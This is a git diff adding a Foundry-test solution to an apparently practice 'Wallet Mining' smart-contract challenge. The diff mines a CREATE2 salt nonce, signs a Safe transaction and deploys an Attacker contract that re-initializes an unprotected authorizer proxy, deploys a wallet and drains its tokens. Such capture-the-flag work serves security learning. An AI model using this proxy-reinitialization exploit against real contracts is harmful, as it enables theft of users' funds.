@@ -11,6 +11,7 @@ import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -34,6 +35,10 @@ contract WalletMiningChallenge is Test {
     Safe singletonCopy;
 
     uint256 initialWalletDeployerTokenBalance;
+    enum Operation {
+        Call,
+        DelegateCall
+    }
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -122,8 +127,128 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {
-        
+
+    Attacker attackerContract;
+
+    function testWalletMining() public checkSolvedByPlayer {
+        uint256 targetNonce; // Variable to hold the nonce when the correct address is found
+
+        // Setup wallet owners for the proxy initialization
+        address[] memory walletOwners = new address[](1);
+        walletOwners[0] = user;
+
+        // Payload for wallet setup during proxy creation
+        bytes memory setupPayload = abi.encodeWithSignature(
+            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+            walletOwners, // Wallet owners
+            1,            // Threshold for multisig
+            address(0),   // Fallback handler
+            "",           // Initial transaction payload
+            address(0),   // Payment token
+            address(0),   // Payment receiver
+            0,            // Payment amount
+            address(0)    // Module manager
+        );
+
+        // Hash of the SafeProxy contract creation code and initializer
+        bytes32 bytecodeHash = keccak256(
+            abi.encodePacked(
+                type(SafeProxy).creationCode, 
+                uint256(uint160(address(singletonCopy)))
+            )
+        );
+
+        // Loop to find the nonce that produces the desired address
+        for (uint256 i = 0; i < 50; i++) {
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(setupPayload), i));
+            address calculatedAddress = address(uint160(uint256(
+                keccak256(abi.encodePacked(
+                    bytes1(0xff),               // CREATE2 opcode
+                    address(proxyFactory),      // Deployer address
+                    salt,                       // Salt for CREATE2
+                    bytecodeHash                // Proxy contract bytecode hash
+                ))
+            )));
+
+            // If the calculated address matches the target address
+            if (calculatedAddress == USER_DEPOSIT_ADDRESS) {
+                targetNonce = i;
+                break;
+            }
+        }
+        console.log(targetNonce);
+
+        require(targetNonce != 0, "Nonce not found");
+
+        // Transaction data for transferring funds
+        bytes memory transactionData = abi.encodeWithSignature(
+            "transfer(address,uint256)", 
+            user,                     // Recipient
+            DEPOSIT_TOKEN_AMOUNT      // Amount to transfer
+        );
+
+        // Encode the transaction details for signing
+        bytes memory encodedTransaction = abi.encode(
+            0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SafeTx hash
+            address(token),           // Target contract (DamnValuableToken)
+            0,                        // Value (0 for token transfer)
+            keccak256(transactionData), // Keccak256 of the transaction payload
+            uint8(0),                 // Operation type (call)
+            0,                        // SafeTx gas
+            0,                        // Base gas
+            0,                        // Gas price
+            address(0),               // Gas token
+            address(0),               // Refund receiver
+            0                         // Nonce
+        );
+
+        // Domain separator for EIP-712 signature
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // EIP-712 domain hash
+                block.chainid,          // Chain ID
+                0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b // Safe contract address
+            )
+        );
+
+        // Calculate the transaction hash for signing
+        bytes32 transactionHash = keccak256(
+            abi.encodePacked(
+                bytes1(0x19),           // EIP-191 prefix
+                bytes1(0x01),           // Version byte
+                domainSeparator,        // Domain separator
+                keccak256(encodedTransaction) // Transaction hash
+            )
+        );
+
+        // Sign the transaction hash
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, transactionHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Final payload to execute the transaction via the wallet
+        bytes memory finalPayload = abi.encodeWithSignature(
+            "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)", 
+            address(token),           // Target contract
+            0,                        // Value
+            transactionData,          // Transaction data
+            uint8(0),                 // Operation type
+            0,                        // SafeTx gas
+            0,                        // Base gas
+            0,                        // Gas price
+            address(0),               // Gas token
+            address(0),               // Refund receiver
+            signature                 // Signature
+        );
+
+        // Deploy the attacker contract
+        attackerContract = new Attacker(
+            user,                      // User address
+            address(authorizer),       // Authorizer contract
+            address(walletDeployer),   // WalletDeployer contract
+            address(token),            // Token contract
+            ward,           // Address to recover tokens
+            finalPayload               // Final transaction payload
+        );
     }
 
     /**
@@ -154,5 +279,52 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+// Attacker contract used to exploit the WalletDeployer
+contract Attacker {
+    AuthorizerUpgradeable authorizer;
+    WalletDeployer deployer;
+    DamnValuableToken token;
+    address targetWallet = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
+
+    constructor(
+        address user, 
+        address authorizerAddress, 
+        address deployerAddress, 
+        address tokenAddress, 
+        address recoveryAddress, 
+        bytes memory finalPayload
+    ) {
+        // Prepare the wallet setup payload
+        address[] memory walletOwners = new address[](1);
+        walletOwners[0] = user;
+        bytes memory setupPayload = abi.encodeWithSignature(
+            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+            walletOwners, 1, address(0), "", address(0), address(0), 0, address(0)
+        );
+
+        // Authorizer configuration
+        address[] memory authorizedWards = new address[](1);
+        authorizedWards[0] = address(this);
+
+        address[] memory authorizedTargets = new address[](1);
+        authorizedTargets[0] = targetWallet;
+
+        authorizer = AuthorizerUpgradeable(payable(authorizerAddress));
+        authorizer.init(authorizedWards, authorizedTargets);
+
+        // Deploy the proxy wallet
+        deployer = WalletDeployer(deployerAddress);
+        //13 is the nonce obtained from the loop we ran above in the test function.
+        deployer.drop(targetWallet, setupPayload, 13);
+
+        // Transfer tokens to the recovery address
+        token = DamnValuableToken(tokenAddress);
+        token.transfer(recoveryAddress, token.balanceOf(address(this)));
+
+        // Execute the final transaction to recover tokens
+        targetWallet.call(finalPayload);
     }
 }
